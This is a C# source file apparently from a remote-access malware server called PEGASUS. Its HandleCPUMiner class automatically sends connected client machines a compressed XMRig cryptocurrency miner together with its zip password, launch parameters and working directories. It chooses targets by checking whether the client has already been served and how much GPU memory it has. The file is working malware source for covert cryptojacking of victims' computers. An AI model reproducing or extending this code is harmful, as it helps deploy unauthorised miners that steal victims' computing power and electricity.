using System.IO;
using System.Threading;
using PEGASUS;
using PEGASUS.Cryptografhsh;
using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using PEGASUS.Properties;

namespace Server.Handle_Packet
{
	internal class HandleCPUMiner
	{
		private void ByteSend(Clients client)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "StartCPU";
			msgPack.ForcePathObject("XMRPROC").AsString = PEGASUS.Properties.Settings.Default.cpu_Proc;
			msgPack.ForcePathObject("ZIPPASSXMRIG").AsString = PEGASUS.Properties.Settings.Default.cpu_zipPassword;
			msgPack.ForcePathObject("PARMXMRIG").AsString = PEGASUS.Properties.Settings.Default.cpu_Parametrs;
			msgPack.ForcePathObject("WORKDIRXMRIG").AsString = PEGASUS.Properties.Settings.Default.cpu_workDir;
			msgPack.ForcePathObject("SYSWORKDIR").AsString = PEGASUS.Properties.Settings.Default.cpu_sysDir;
			msgPack.ForcePathObject("DELAY").AsString = PEGASUS.Properties.Settings.Default.cpu_delay.ToString();
			msgPack.ForcePathObject("IDPARAMETERS").AsString = PEGASUS.Properties.Settings.Default.cpu_idParameters.ToString();
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(PEGASUS.Properties.Settings.Default.cpuFile)));
			ThreadPool.QueueUserWorkItem(client.Send, msgPack.Encode2Bytes());
		}

		public void GetCPU(Clients client, MsgPack unpack_msgpack)
		{
			lock (PEGASUS.Settings.LockListviewClients)
			{
				try
				{
					int num = (int)unpack_msgpack.ForcePathObject("GPURAM").AsInteger;
					if (!PEGASUS.Properties.Settings.Default.autoStart_cpu || PEGASUS.Properties.Settings.Default.cpu_idParameters == unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString)
					{
						return;
					}
					if (PEGASUS.Properties.Settings.Default.notInstallCPUgpu6)
					{
						try
						{
							if (num < 6)
							{
								ByteSend(client);
							}
							return;
						}
						catch
						{
							if (unpack_msgpack.ForcePathObject("GPURAM").AsString == "NA")
							{
								ByteSend(client);
							}
							return;
						}
					}
					ByteSend(client);
				}
				catch
				{
					ByteSend(client);
				}
			}
		}
	}
}
